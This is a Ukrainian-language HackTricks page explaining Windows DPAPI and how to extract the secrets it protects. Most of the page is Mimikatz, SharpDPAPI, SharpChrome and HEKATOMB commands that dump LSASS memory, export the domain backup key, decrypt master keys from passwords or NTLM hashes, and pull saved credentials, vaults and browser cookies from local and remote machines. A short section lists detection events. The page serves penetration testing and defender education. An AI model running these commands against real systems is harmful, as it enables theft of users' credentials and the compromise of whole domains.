# DPAPI - Витягування Паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

API захисту даних (DPAPI) в основному використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи або секрети користувача, або системні секрети як значне джерело ентропії. Цей підхід спрощує шифрування для розробників, дозволяючи їм шифрувати дані, використовуючи ключ, отриманий з секретів входу користувача або, для системного шифрування, секретів аутентифікації домену системи, таким чином усуваючи необхідність для розробників управляти захистом ключа шифрування самостійно.

Найпоширеніший спосіб використання DPAPI - це через функції **`CryptProtectData` і `CryptUnprotectData`**, які дозволяють додаткам безпечно шифрувати та дешифрувати дані з сеансом процесу, який наразі увійшов в систему. Це означає, що зашифровані дані можуть бути дешифровані лише тим же користувачем або системою, які їх зашифрували.

Більше того, ці функції також приймають параметр **`entropy`**, який також буде використовуватися під час шифрування та дешифрування, тому, щоб дешифрувати щось, зашифроване з використанням цього параметра, ви повинні надати таке ж значення ентропії, яке використовувалося під час шифрування.

### Генерація ключів користувачів

DPAPI генерує унікальний ключ (називається **`pre-key`**) для кожного користувача на основі їхніх облікових даних. Цей ключ отримується з пароля користувача та інших факторів, а алгоритм залежить від типу користувача, але в кінцевому підсумку є SHA1. Наприклад, для доменних користувачів **він залежить від HTLM хешу користувача**.

Це особливо цікаво, оскільки, якщо зловмисник може отримати хеш пароля користувача, він може:

- **Дешифрувати будь-які дані, які були зашифровані за допомогою DPAPI** з використанням ключа цього користувача без необхідності звертатися до будь-якого API
- Спробувати **зламати пароль** офлайн, намагаючись згенерувати дійсний ключ DPAPI

Більше того, щоразу, коли користувач шифрує дані за допомогою DPAPI, генерується новий **майстер-ключ**. Цей майстер-ключ фактично використовується для шифрування даних. Кожен майстер-ключ надається з **GUID** (глобально унікальний ідентифікатор), який його ідентифікує.

Майстер-ключі зберігаються в каталозі **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` - це ідентифікатор безпеки цього користувача. Майстер-ключ зберігається зашифрованим за допомогою **`pre-key`** користувача, а також за допомогою **доменного резервного ключа** для відновлення (так що той самий ключ зберігається зашифрованим 2 рази 2 різними паролями).

Зверніть увагу, що **доменний ключ, використаний для шифрування майстер-ключа, знаходиться на контролерах домену і ніколи не змінюється**, тому, якщо зловмисник має доступ до контролера домену, він може отримати доменний резервний ключ і дешифрувати майстер-ключі всіх користувачів у домені.

Зашифровані блоби містять **GUID майстер-ключа**, який використовувався для шифрування даних, у своїх заголовках.

> [!NOTE]
> Зашифровані блоби DPAPI починаються з **`01 00 00 00`**

Знайти майстер-ключі:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Це те, як виглядає кілька Master Keys користувача:

![](<../../images/image (1121).png>)

### Генерація ключа машини/системи

Це ключ, який використовується для шифрування даних на машині. Він базується на **DPAPI_SYSTEM LSA secret**, який є спеціальним ключем, до якого може отримати доступ лише користувач SYSTEM. Цей ключ використовується для шифрування даних, які повинні бути доступні самій системі, таких як облікові дані на рівні машини або системні секрети.

Зверніть увагу, що ці ключі **не мають резервної копії домену**, тому вони доступні лише локально:

- **Mimikatz** може отримати доступ до них, вивантажуючи LSA секрети за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в реєстрі, тому адміністратор може **змінити DACL дозволи для доступу до нього**. Шлях до реєстру: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Захищені дані за допомогою DPAPI

Серед особистих даних, захищених DPAPI, є:

- Облікові дані Windows
- Паролі Internet Explorer та Google Chrome і дані автозаповнення
- Паролі електронної пошти та внутрішніх FTP-акаунтів для таких програм, як Outlook та Windows Mail
- Паролі для спільних папок, ресурсів, бездротових мереж і Windows Vault, включаючи ключі шифрування
- Паролі для підключень до віддаленого робочого столу, .NET Passport та приватні ключі для різних цілей шифрування та аутентифікації
- Мережеві паролі, керовані Credential Manager, та особисті дані в програмах, що використовують CryptProtectData, таких як Skype, MSN messenger тощо
- Зашифровані блоби всередині реєстру
- ...

Захищені дані системи включають:
- Паролі Wifi
- Паролі запланованих завдань
- ...

### Варіанти витягування майстер-ключів

- Якщо користувач має привілеї адміністратора домену, він може отримати доступ до **доменного резервного ключа** для розшифровки всіх майстер-ключів користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- З локальними адміністративними привілеями можливо **отримати доступ до пам'яті LSASS**, щоб витягти майстер-ключі DPAPI всіх підключених користувачів та ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні адміністративні привілеї, він може отримати доступ до **DPAPI_SYSTEM LSA секрету** для розшифрування майстер-ключів машини:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо відомий пароль або хеш NTLM користувача, ви можете **декодувати майстер-ключі користувача безпосередньо**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви знаходитесь у сесії як користувач, можливо запитати у DC **резервний ключ для розшифрування майстер-ключів за допомогою RPC**. Якщо ви є локальним адміністратором і користувач увійшов у систему, ви могли б **викрасти його токен сесії** для цього:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список сховищ
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Знайти зашифровані дані DPAPI

Звичайні **файли, що захищені** користувачами, знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Також перевірте, змінивши `\Roaming\` на `\Local\` у вищезазначених шляхах.

Приклади перерахування:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знаходити зашифровані DPAPI блоби у файловій системі, реєстрі та B64 блобах:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того ж репозиторію) може бути використаний для розшифрування за допомогою DPAPI чутливих даних, таких як куки.

### Ключі доступу та дані

- **Використовуйте SharpDPAPI** для отримання облікових даних з файлів, зашифрованих DPAPI, з поточної сесії:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримати інформацію про облікові дані** такі як зашифровані дані та guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Отримання masterkeys**:

Розшифруйте masterkey користувача, запитуючи **ключ резервної копії домену** за допомогою RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування майстер-ключа (зверніть увагу, що можна використовувати `/rpc` для отримання резервного ключа домену, `/password` для використання пароля у відкритому вигляді або `/pvk` для вказівки файлу приватного ключа домену DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою майстер-ключа**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для розшифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використовувати `/rpc` для отримання резервного ключа домену, `/password` для використання пароля у відкритому вигляді, `/pvk` для вказівки файлу приватного ключа домену DPAPI, `/unprotect` для використання сеансу поточного користувача...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Розшифрувати деякі дані, використовуючи **поточну сесію користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Доступ до даних інших машин

В **SharpDPAPI та SharpChrome** ви можете вказати опцію **`/server:HOST`** для доступу до даних віддаленої машини. Звичайно, вам потрібно мати доступ до цієї машини, і в наступному прикладі припускається, що **ключ шифрування резервної копії домену відомий**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) - це інструмент, який автоматизує витягування всіх користувачів і комп'ютерів з LDAP-директорії та витягування резервного ключа контролера домену через RPC. Скрипт потім визначить IP-адреси всіх комп'ютерів і виконає smbclient на всіх комп'ютерах, щоб отримати всі DPAPI блоби всіх користувачів і розшифрувати все за допомогою резервного ключа домену.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

З витягнутим списком комп'ютерів з LDAP ви можете знайти кожну підмережу, навіть якщо ви їх не знали!

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично вивантажувати секрети, захищені DPAPI.

### Загальні виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших каталогах, пов'язаних з DPAPI.
- Особливо з мережевої папки, такої як C$ або ADMIN$.
- Використання Mimikatz для доступу до пам'яті LSASS.
- Подія **4662**: Операція була виконана над об'єктом.
- Цю подію можна перевірити, щоб дізнатися, чи був доступ до об'єкта `BCKUPKEY`.

## Посилання

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
